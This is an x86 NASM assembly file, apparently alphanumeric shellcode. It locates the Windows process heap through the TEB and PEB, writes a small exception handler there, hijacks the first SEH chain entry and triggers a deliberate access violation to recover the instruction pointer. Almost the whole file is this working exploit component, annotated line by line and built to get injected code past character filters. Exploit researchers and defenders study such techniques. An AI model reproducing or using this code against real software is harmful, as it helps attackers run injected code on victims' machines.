BITS 32

; The address operands can be encoded in various ways. Unfortunately, NASM does
; not always use the one we want (an alphanumeric variant). Which is why we have
; to use these:
%define xor_esp_esi       db 0x31, 0x34, 0x64     ; XOR [ESP], ESI
%define xor_esi_esp       db 0x33, 0x34, 0x64     ; XOR ESI, [ESP]
%define xor_esi_esi_eax   db 0x33, 0x34, 0x30     ; XOR ESI, [ESI+EAX]

; Find out where the heap lives
  PUSH    ESI                         ; [ESP0] = ESI
  xor_esi_esp     ; XOR ESI, [ESP]    ; ESI = ESI ^ [ESP0] == ESI ^ ESI == 0
  PUSH    BYTE 0x50                   ; [ESP2] = 0x50
  POP     EAX                         ; EAX = [ESP2] = 0x50
  PUSH    EAX                         ; [ESP1] = 0x50
  XOR     AL, 0x48                    ; EAX = 0x50 ^ 0x48 = 0x18
; There is a pointer to the TEB at FS:[0x18:0x1B]
  XOR     ESI, [FS:EAX]               ; ESI ^= FS:[0x18:0x1B] == 0 ^ &TEB == &TEB
  PUSH    ESI                         ; [ESP2] = &TEB
; There is a pointer to the PEB at TEB[0x30:0x33]
  XOR     ESI, [BYTE ESI+0x30]        ; ESI = &TEB ^ TEB[0x30:0x33]
  xor_esi_esp     ; XOR ESI, [ESP]    ; ESI = &TEB ^ TEB[0x30:0x33] ^ &TEB == TEB[0x30:0x33] == &PEB
  POP     ECX                         ; ECX = [ESP2] = &TEB
; There is a pointer to the process heap at PEB[0x18:0x1B]
  PUSH    ESI                         ; [ESP2] = &PEB
  xor_esi_esi_eax ; XOR ESI, [ESI+EAX]; ESI = &PEB ^ PEB[0x18:0x1B]
  xor_esp_esi     ; XOR [ESP], ESI    ; [ESP2] = &PEB ^ &PEB ^ PEB[0x18:0x1B] = PEB[0x18:0x1B] = &process_heap
  POP     EDX                         ; EDX = [ESP2] = &process_heap
; Create the SEH handler code:
  POP     EAX                         ; EAX = [ESP1] = 0x50
  XOR     AL, 0x50 ^ 0x26             ; EAX = 0x50 ^ (0x50 ^ 0x26) = 0x26
  PUSH    EAX                         ; ESP1 => 26 00 00 00 [ESP0]
  XOR     AL, 0x50 ^ 0x26             ; EAX = 0x26 ^ (0x50 ^ 0x26) = 0x50
  XOR     AL, 0x50                    ; EAX = 0x50 ^ 0x50 = 0
  DEC     EAX                         ; EAX = 0xFFFFFFFF
  PUSH    EAX                         ; ESP2 => FF FF FF FF 26 00 00 00 [ESP0]
  PUSH    WORD 0x3131                 ; ESP~3 => 31 31 FF FF FF FF 26 00 00 00 [ESP0]
  INC     ESP                         ; ESP~3 => 31 FF FF FF FF 26 00 00 00 [ESP0]
  POP     EAX                         ; EAX~2 = [ESP] = 31 FF FF FF
  XOR     EAX, 0xFFFFFF61^0xADADAD31  ; EAX = 31 FF FF FF ^ 61 FF FF FF ^ 31 AD AD AD = 61 AD AD AD
; Our SEH_handler is now stored in EAX & [ESP~2] (EAX = "POPA, LODSD, LODSD, LODSD", ESP[0:1] = "JMP [ESI]")
  PUSH    ESI                         ; [ESP~3] = ESI
  xor_esi_esp     ; XOR ESI, [ESP]    ; ESI = ESI ^ [ESP~4] = ESI ^ ESI = 0
  DEC     ESI                         ; ESI = 0xFFFFFFFF
index equ 0x34
  PUSH    BYTE 0xFF ^ (-index & 0xFF) ; [ESP~4] = (0xFF ^ -index)
  xor_esi_esp     ; XOR ESI, [ESP]    ; ESI = 0xFFFFFFFF ^ (0xFF ^ -index) = -index
  XOR     EAX, [EDX+ESI+index]        ; EAX = SEH_handler[0:3] ^ process_heap[0:3] (= Garbage)
  XOR     [EDX+ESI+index], EAX        ; process_heap[0:3] = process_heap[0:3] ^ (SEH_handler[0:3] ^ process_heap[0:3]) = SEH_handler[0:3]
  POP     EAX                         ; EAX = [ESP~4] (= Garbage)
  POP     EAX                         ; EAX = [ESP~3] (= Garbage)
  POP     AX                          ; AX = [ESP~2] = SEH_handler[4:5]
  XOR     EAX, [EDX+ESI+index+4]      ; AX = SEH_handler[4:5] ^ process_heap[4:5] (= Garbage)
  XOR     [EDX+ESI+index+4], AX         ; process_heap[4:5] = process_heap[4:5] ^ (SEH_handler[4:5] ^ process_heap[4:5]) = SEH_handler[4:5]
; Overwrite the first entry in the SEH chain with the address of our handler on the heap
; Remember ECX => TEB, EDX => SEH handler
  PUSH    BYTE 0x41                   ; ESP~2 => 41 00 00 00 00 00 00 [ESP0]
  POP     EAX                         ; ESP~1 => 00 00 00 [ESP0]
  DEC     ESP                         ; ESP1 => 00 00 00 00 [ESP0]
  POP     EAX                         ; EAX = [ESP1] = 0
  XOR     EAX, [ECX+ESI*2+index*2]    ; EAX = 0 ^ TEB[0:3] = &SEH_chain
  XOR     EDX, [EAX+ESI*2+index*2+4]  ; EDX = &SEH_handler ^ SEH_chain->SEH_handler
  XOR     [EAX+ESI*2+index*2+4], EDX  ; SEH_chain->SEH_handler = SEH_chain->SEH_handler ^ &SEH_handler ^ SEH_chain->SEH_handler = &SEH_handler
; Cause exception
  CMP     [ESI], ESI                  ; Access violation while reading from adress 0x00000030
; Now the exception handler is executed. When our SEH handler on the heap runs,
; the second DWORD on the stack points to a structure that contains information
; about the exception, including the address of the instruction that caused it.
; Using POPA we can pop the first 8 DWORDS of the stack. The second DWORD ends
; up in ESI.
; ==> POPA                            ; ESI = &struct_exception_info
; This structure contains EIP in the fourth DWORD, so we can jump back from our
; SEH handler into our SEH GetPC code using that value:
; ==> LODSD, LODSD, LODSD             ; ESI = &struct_exception_info->EIP
; ==> JMP [ESI]                       ; [ESI] = struct_exception_info->EIP
; The instruction that caused the exception in the first place is executed again
; but because we have modified the value of ESI to point to a valid address, it
; no longer causes an exception and execution continues:
;  CMP     [ESI], ESI                  ;
